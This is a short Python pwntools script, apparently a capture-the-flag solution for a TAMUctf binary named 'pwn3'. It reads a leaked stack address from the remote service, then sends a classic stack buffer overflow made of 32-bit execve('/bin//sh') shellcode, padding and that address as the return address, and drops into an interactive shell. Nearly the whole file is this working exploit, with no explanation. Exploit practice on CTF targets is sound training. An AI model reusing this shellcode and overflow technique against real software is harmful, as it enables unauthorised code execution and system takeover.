#!/usr/bin/env python2.7

from pwn import *


def parse(text):

    pos = text.find("0x")
    addr = text[pos+2:pos+10]

    #addr = struct.pack('Q<', addr)

    addr = int(addr, 16)

    print(addr)

    return p32(addr)

if __name__ == '__main__':

    # e = process("./pwn3")
    e = remote("pwn.tamuctf.com", 4323)

    out = e.recvline()

    addr = parse(out)

    print("[+] Input addresse: " + addr)

    #payload = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80AA' + 'A'*279 + '\xfe\xcc\xff\xff'
    payload = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80AA' + 'A'*279 + addr

    print(payload)

    print(e.sendline(payload))
    e.interactive()
    #
    # out = e.recvline()
    # print(out)
    # e.interactive()
